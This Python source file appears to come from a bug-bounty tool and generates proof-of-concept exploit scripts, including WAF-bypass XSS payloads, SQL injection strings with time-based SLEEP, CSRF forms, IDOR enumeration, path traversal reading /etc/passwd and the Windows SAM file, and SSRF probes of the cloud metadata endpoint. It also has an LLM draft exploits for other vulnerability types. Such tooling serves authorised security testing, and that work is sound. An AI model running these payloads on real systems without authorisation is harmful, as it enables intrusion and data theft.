"""
Proof of Concept Generator

AI-powered PoC generation for vulnerabilities with WAF bypass techniques.
"""

import logging
from typing import List, Dict, Optional, Any
from datetime import datetime
from pathlib import Path

from src.bugbounty.models import (
    Vulnerability, VulnerabilityType, ProofOfConcept
)
from src.cognitive.llm.inference import LLMInference
from src.config import settings

logger = logging.getLogger(__name__)


class PoCGenerator:
    """
    Generate proof-of-concept exploits for vulnerabilities
    
    Features:
    - AI-powered exploit generation
    - WAF bypass techniques
    - Safe, non-destructive exploits
    - Multiple exploit variants
    - Step-by-step reproduction
    """
    
    def __init__(self, llm_client: Optional[LLMInference] = None):
        """
        Initialize PoC generator
        
        Args:
            llm_client: LLM inference client for AI generation
        """
        self.llm = llm_client or LLMInference()
        logger.info("PoCGenerator initialized")
    
    async def generate_poc(
        self,
        vulnerability: Vulnerability,
        include_waf_bypass: bool = True,
        safe_only: bool = True
    ) -> ProofOfConcept:
        """
        Generate proof of concept for vulnerability
        
        Args:
            vulnerability: Vulnerability to generate PoC for
            include_waf_bypass: Include WAF bypass techniques
            safe_only: Only generate safe, non-destructive exploits
            
        Returns:
            ProofOfConcept object
        """
        logger.info(f"Generating PoC for {vulnerability.title}")
        
        if vulnerability.vuln_type == VulnerabilityType.XSS:
            return await self._generate_xss_poc(vulnerability, include_waf_bypass)
        elif vulnerability.vuln_type == VulnerabilityType.SQL_INJECTION:
            return await self._generate_sqli_poc(vulnerability, safe_only)
        elif vulnerability.vuln_type == VulnerabilityType.CSRF:
            return await self._generate_csrf_poc(vulnerability)
        elif vulnerability.vuln_type == VulnerabilityType.IDOR:
            return await self._generate_idor_poc(vulnerability)
        elif vulnerability.vuln_type == VulnerabilityType.LFI:
            return await self._generate_lfi_poc(vulnerability, safe_only)
        elif vulnerability.vuln_type == VulnerabilityType.SSRF:
            return await self._generate_ssrf_poc(vulnerability, safe_only)
        else:
            return await self._generate_ai_poc(vulnerability, safe_only)
    
    async def _generate_xss_poc(
        self,
        vuln: Vulnerability,
        waf_bypass: bool
    ) -> ProofOfConcept:
        """Generate XSS proof of concept"""
        
        basic_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>'
        ]
        
        waf_bypass_payloads = [
            '<sCrIpT>alert("XSS")</ScRiPt>',
            '<script>eval(atob("YWxlcnQoIlhTUyIp"))</script>',
            '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">',
            '<svg/onload=alert(String.fromCharCode(88,83,83))>'
        ]
        
        payloads = waf_bypass_payloads if waf_bypass else basic_payloads
        
        param = vuln.parameter or "q"
        url = vuln.url
        
        exploit_code = f"""# XSS Proof of Concept
# Target: {url}
# Parameter: {param}

import requests

url = "{url}"
payloads = {payloads}

for payload in payloads:
    params = {{"{param}": payload}}
    response = requests.get(url, params=params)
    
    if payload in response.text:
        print(f"✓ XSS Confirmed with payload: {{payload}}")
        print(f"Response contains: {{payload}}")
        break
else:
    print("✗ XSS not confirmed (may be filtered)")
"""
        
        steps = [
            f"Navigate to: {url}",
            f"Inject payload into parameter '{param}'",
            f"Try payloads: {', '.join(payloads[:2])}",
            "Observe if JavaScript executes",
            "Confirm XSS by checking if alert() triggers"
        ]
        
        return ProofOfConcept(
            vulnerability_id=vuln.id,
            exploit_code=exploit_code,
            exploit_type="XSS",
            steps=steps,
            waf_bypass=waf_bypass,
            safe_for_production=True,
            expected_result="JavaScript alert() dialog appears, confirming XSS vulnerability"
        )
    
    async def _generate_sqli_poc(
        self,
        vuln: Vulnerability,
        safe_only: bool
    ) -> ProofOfConcept:
        """Generate SQL Injection proof of concept"""
        
        param = vuln.parameter or "id"
        url = vuln.url
        
        if safe_only:
            payloads = [
                "' OR '1'='1",
                "1' AND '1'='1",
                "1' OR 1=1--",
                "1' UNION SELECT NULL--"
            ]
        else:
            payloads = [
                "' OR '1'='1",
                "1' OR 1=1--",
                "1' UNION SELECT NULL,NULL,NULL--",
                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
            ]
        
        exploit_code = f"""# SQL Injection Proof of Concept
# Target: {url}
# Parameter: {param}
# SAFE MODE: {safe_only}

import requests
import time

url = "{url}"
payloads = {payloads}

for payload in payloads:
    params = {{"{param}": payload}}
    
    start = time.time()
    response = requests.get(url, params=params)
    elapsed = time.time() - start
    
    if response.status_code == 200:
        if len(response.text) > 0:
            print(f"✓ SQLi likely with payload: {{payload}}")
            print(f"Response time: {{elapsed:.2f}}s")
            print(f"Response length: {{len(response.text)}} bytes")
            break
else:
    print("✗ SQLi not confirmed")
"""
        
        steps = [
            f"Navigate to: {url}",
            f"Test parameter '{param}' with SQL injection payloads",
            f"Try safe payloads: {', '.join(payloads[:2])}",
            "Observe if application behavior changes (errors, extra data, timing)",
            "Confirm SQLi based on different responses"
        ]
        
        return ProofOfConcept(
            vulnerability_id=vuln.id,
            exploit_code=exploit_code,
            exploit_type="SQLi",
            steps=steps,
            waf_bypass=False,
            safe_for_production=safe_only,
            expected_result="Application returns different responses, errors, or timing differences indicating SQL injection"
        )
    
    async def _generate_csrf_poc(self, vuln: Vulnerability) -> ProofOfConcept:
        """Generate CSRF proof of concept"""
        
        url = vuln.url
        
        exploit_code = f"""<!-- CSRF Proof of Concept -->
<!-- Target: {url} -->

<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC</title>
</head>
<body>
    <h1>CSRF Proof of Concept</h1>
    
    <form id="csrf-form" action="{url}" method="POST">
        <input type="hidden" name="action" value="test_csrf">
        <input type="hidden" name="value" value="poc_value">
        <input type="submit" value="Click to test CSRF">
    </form>
    
    <script>
        // Auto-submit (for testing only)
        // document.getElementById('csrf-form').submit();
    </script>
    
    <p>This form submits a request to the target URL without CSRF tokens.</p>
    <p>If the action succeeds, CSRF vulnerability is confirmed.</p>
</body>
</html>
"""
        
        steps = [
            "Save the HTML code to csrf_poc.html",
            "Open the HTML file in a browser where you're authenticated to the target",
            "Click the submit button (or auto-submit)",
            "Check if the action is executed without CSRF token validation",
            "Confirm CSRF if action succeeds"
        ]
        
        return ProofOfConcept(
            vulnerability_id=vuln.id,
            exploit_code=exploit_code,
            exploit_type="CSRF",
            steps=steps,
            waf_bypass=False,
            safe_for_production=True,
            expected_result="The forged request is accepted and executed by the application"
        )
    
    async def _generate_idor_poc(self, vuln: Vulnerability) -> ProofOfConcept:
        """Generate IDOR proof of concept"""
        
        param = vuln.parameter or "id"
        url = vuln.url
        
        exploit_code = f"""# IDOR Proof of Concept
# Target: {url}
# Parameter: {param}

import requests

url = "{url}"
param = "{param}"

# Test with different ID values
test_ids = [1, 2, 100, 999, "admin", "test"]

for test_id in test_ids:
    params = {{param: test_id}}
    response = requests.get(url, params=params)
    
    if response.status_code == 200:
        print(f"✓ Accessible with {{param}}={{test_id}}")
        print(f"Content length: {{len(response.text)}} bytes")
        
        # Check if different user's data is accessible
        if "user" in response.text.lower() or "email" in response.text.lower():
            print("⚠ Possible data leakage detected")
    else:
        print(f"✗ Not accessible: {{test_id}} ({{response.status_code}})")
"""
        
        steps = [
            f"Navigate to: {url}",
            f"Identify the ID parameter: '{param}'",
            "Note your current user ID",
            "Try accessing other user IDs (increment/decrement)",
            "Check if you can access other users' data",
            "Confirm IDOR if unauthorized data is accessible"
        ]
        
        return ProofOfConcept(
            vulnerability_id=vuln.id,
            exploit_code=exploit_code,
            exploit_type="IDOR",
            steps=steps,
            waf_bypass=False,
            safe_for_production=True,
            expected_result="Unauthorized access to other users' data by manipulating the ID parameter"
        )
    
    async def _generate_lfi_poc(
        self,
        vuln: Vulnerability,
        safe_only: bool
    ) -> ProofOfConcept:
        """Generate LFI proof of concept"""
        
        param = vuln.parameter or "file"
        url = vuln.url
        
        if safe_only:
            payloads = [
                "../../etc/passwd",
                "..\\..\\windows\\win.ini"
            ]
        else:
            payloads = [
                "../../etc/passwd",
                "../../../../etc/passwd",
                "..\\..\\..\\..\\windows\\system32\\config\\sam",
                "php://filter/convert.base64-encode/resource=index.php"
            ]
        
        exploit_code = f"""# LFI Proof of Concept
# Target: {url}
# Parameter: {param}

import requests

url = "{url}"
payloads = {payloads}

for payload in payloads:
    params = {{"{param}": payload}}
    response = requests.get(url, params=params)
    
    if "root:" in response.text or "[extensions]" in response.text:
        print(f"✓ LFI Confirmed with payload: {{payload}}")
        print(f"File contents leaked:")
        print(response.text[:500])
        break
else:
    print("✗ LFI not confirmed")
"""
        
        steps = [
            f"Navigate to: {url}",
            f"Test parameter '{param}' with path traversal payloads",
            f"Try: {payloads[0]}",
            "Check if file contents are returned in response",
            "Confirm LFI if system files are readable"
        ]
        
        return ProofOfConcept(
            vulnerability_id=vuln.id,
            exploit_code=exploit_code,
            exploit_type="LFI",
            steps=steps,
            waf_bypass=False,
            safe_for_production=safe_only,
            expected_result="System files (like /etc/passwd or win.ini) contents are displayed in the response"
        )
    
    async def _generate_ssrf_poc(
        self,
        vuln: Vulnerability,
        safe_only: bool
    ) -> ProofOfConcept:
        """Generate SSRF proof of concept"""
        
        param = vuln.parameter or "url"
        url = vuln.url
        
        if safe_only:
            payloads = [
                "http://127.0.0.1",
                "http://localhost"
            ]
        else:
            payloads = [
                "http://127.0.0.1",
                "http://169.254.169.254/latest/meta-data/",
                "file:///etc/passwd",
                "http://internal-service:8080"
            ]
        
        exploit_code = f"""# SSRF Proof of Concept
# Target: {url}
# Parameter: {param}

import requests

url = "{url}"
payloads = {payloads}

for payload in payloads:
    params = {{"{param}": payload}}
    response = requests.get(url, params=params)
    
    if response.status_code == 200:
        print(f"✓ SSRF likely with payload: {{payload}}")
        print(f"Response: {{response.text[:200]}}")
        
        if "127.0.0.1" in response.text or "localhost" in response.text:
            print("⚠ Internal server response detected")
            break
else:
    print("✗ SSRF not confirmed")
"""
        
        steps = [
            f"Navigate to: {url}",
            f"Test parameter '{param}' with internal URLs",
            "Try: http://127.0.0.1",
            "Check if internal services respond",
            "Confirm SSRF if internal responses are visible"
        ]
        
        return ProofOfConcept(
            vulnerability_id=vuln.id,
            exploit_code=exploit_code,
            exploit_type="SSRF",
            steps=steps,
            waf_bypass=False,
            safe_for_production=safe_only,
            expected_result="Application fetches content from internal URLs, confirming SSRF"
        )
    
    async def _generate_ai_poc(
        self,
        vuln: Vulnerability,
        safe_only: bool
    ) -> ProofOfConcept:
        """Generate PoC using AI for unknown vulnerability types"""
        
        prompt = f"""Generate a safe proof-of-concept exploit for the following vulnerability:

Title: {vuln.title}
Type: {vuln.vuln_type.value}
Severity: {vuln.severity.value}
URL: {vuln.url}
Parameter: {vuln.parameter or 'N/A'}
Description: {vuln.description}
Evidence: {vuln.evidence}

Requirements:
- Safe, non-destructive exploit only
- Python or curl/HTTP requests
- Clear step-by-step reproduction
- Expected results

Provide:
1. Exploit code (Python preferred)
2. Step-by-step instructions
3. Expected result

Format as Python code with comments."""

        try:
            response = await self.llm.generate_async(
                prompt=prompt,
                max_tokens=1500,
                temperature=0.3
            )
            
            exploit_code = response.get("content", "# AI-generated exploit\nprint('Unable to generate exploit')")
            
            steps = [
                f"Review vulnerability at: {vuln.url}",
                "Execute the generated exploit code",
                "Observe the application response",
                "Confirm vulnerability based on expected behavior"
            ]
            
            return ProofOfConcept(
                vulnerability_id=vuln.id,
                exploit_code=exploit_code,
                exploit_type=vuln.vuln_type.value,
                steps=steps,
                waf_bypass=False,
                safe_for_production=safe_only,
                expected_result="Vulnerability is confirmed based on application behavior"
            )
            
        except Exception as e:
            logger.error(f"AI PoC generation failed: {e}")
            
            fallback_code = f"""# Manual PoC Required
# Vulnerability: {vuln.title}
# URL: {vuln.url}
# Parameter: {vuln.parameter or 'N/A'}

# Please manually test this vulnerability
# Description: {vuln.description}
"""
            
            return ProofOfConcept(
                vulnerability_id=vuln.id,
                exploit_code=fallback_code,
                exploit_type=vuln.vuln_type.value,
                steps=["Manual testing required"],
                waf_bypass=False,
                safe_for_production=True,
                expected_result="Manual confirmation needed"
            )
